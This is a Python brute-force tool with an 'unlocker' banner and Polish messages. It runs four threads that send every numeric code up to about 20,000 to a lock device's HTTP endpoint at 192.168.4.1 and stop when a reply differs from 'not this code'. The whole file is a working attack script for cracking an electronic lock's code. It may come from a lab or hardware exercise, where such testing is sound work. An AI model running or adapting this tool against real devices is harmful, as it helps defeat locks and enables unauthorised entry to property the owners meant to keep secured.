import threading
import os
import httpx
import time
import queue
from lolpython import lol_py
from subprocess import run
from colorama import Fore, Style

logo = r'''
 ________  ________  _____ ______   _______   ___  __            ___  ___  ________   ___       ________  ________  ___  __    _______   ________     
|\_____  \|\   __  \|\   _ \  _   \|\  ___ \ |\  \|\  \         |\  \|\  \|\   ___  \|\  \     |\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \    
 \|___/  /\ \  \|\  \ \  \\\__\ \  \ \   __/|\ \  \/  /|_       \ \  \\\  \ \  \\ \  \ \  \    \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \   
     /  / /\ \   __  \ \  \\|__| \  \ \  \_|/_\ \   ___  \       \ \  \\\  \ \  \\ \  \ \  \    \ \  \\\  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\  
    /  /_/__\ \  \ \  \ \  \    \ \  \ \  \_|\ \ \  \\ \  \       \ \  \\\  \ \  \\ \  \ \  \____\ \  \\\  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \| 
   |\________\ \__\ \__\ \__\    \ \__\ \_______\ \__\\ \__\       \ \_______\ \__\\ \__\ \_______\ \_______\ \_______\ \__\\ \__\ \_______\ \__\\ _\ 
    \|_______|\|__|\|__|\|__|     \|__|\|_______|\|__| \|__|        \|_______|\|__| \|__|\|_______|\|_______|\|_______|\|__| \|__|\|_______|\|__|\|__|
                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                                                                                                                                                
'''

def number_bruteforce(range_start, range_end, result_queue, stop_event):
    thread_num = threading.current_thread().name
    thread_color = get_thread_color(thread_num)
    for i in range(range_start, range_end):
        kod = int(f'{i}')
        retry_count = 0
        while retry_count < 3:
            print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Próba kodu: {i}')
            try:
                with httpx.Client(timeout=5) as client:
                    response = client.get(f'http://192.168.4.1/kodzamkato/{kod}')
                response.raise_for_status()  # Raise an exception for non-successful status codes
                break
            except httpx.RequestError as e:
                print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Błąd podczas żądania: {e}')
                time.sleep(0.5)
            except httpx.HTTPStatusError as e:
                print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Odpowiedź serwera: {e.response.status_code}')
                break

            retry_count += 1

        if response.status_code != 200:
            continue

        print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} {response.text}')
        if not response.text == "NIE TEN KOD":
            result_queue.put(i)
            stop_event.set()  # Set the stop event to signal other threads to stop
            break
        time.sleep(0.5)

        if stop_event.is_set():  # Check if stop event is set and break out of the loop
            break

def get_thread_color(thread_num):
    colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN]
    color_index = int(thread_num.split("-")[-1]) % len(colors)
    return colors[color_index]

def main():
    lol_py(logo)
    print(Fore.RESET)
    num_threads = 4  # Number of threads to use
    result_queue = queue.Queue()
    stop_event = threading.Event()

    # Prompt user to press Enter before starting
    input("Press Enter to start the brute-force process...")

    # Calculate the range of numbers for each thread
    range_size = 5038
    range_start = 0
    range_end = range_size

    # Create and start the threads
    threads = []
    for i in range(num_threads):
        thread_name = f"Thread-{i}"
        thread = threading.Thread(target=number_bruteforce, args=(range_start, range_end, result_queue, stop_event), name=thread_name)
        threads.append(thread)
        thread.start()

        # Update the range for the next thread
        range_start += range_size
        range_end += range_size

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Retrieve the result from the queue
    result = result_queue.get()

    # Print the found number
    print(f"{Fore.GREEN}Found number: {result}{Style.RESET_ALL}")

if __name__ == '__main__':
    main()